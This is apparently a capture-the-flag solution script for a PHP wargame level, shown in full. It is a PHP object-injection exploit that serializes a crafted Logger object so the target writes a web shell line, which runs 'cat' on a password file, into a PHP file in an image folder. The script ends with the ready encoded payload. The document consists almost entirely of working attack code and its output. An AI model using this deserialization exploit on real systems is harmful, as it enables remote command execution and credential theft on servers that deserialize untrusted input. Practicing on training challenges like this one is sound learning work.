// passthru : 執行系統外部命令

<?php

class Logger {
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct($file){
        // initialise variables
        $this->initMsg = "the answer is <? passthru('cat /etc/natas_webpass/natas27'); ?>\n\n";
        $this->exitMsg = "the answer is <? passthru('cat /etc/natas_webpass/natas27'); ?>\n";
        $this->logFile = "img/test.php";
    }                       
                       
}

$obj = new Logger("Hello");

echo serialize($obj);
echo "\nbase64_encoded:\n";
echo urlencode(base64_encode(serialize($obj)));

?>

// Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Rlc3QucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6NjU6InRoZSBhbnN3ZXIgaXMgPD8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPgoKIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjQ6InRoZSBhbnN3ZXIgaXMgPD8gcGFzc3RocnUoJ2NhdCAvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA%2FPgoiO30%3D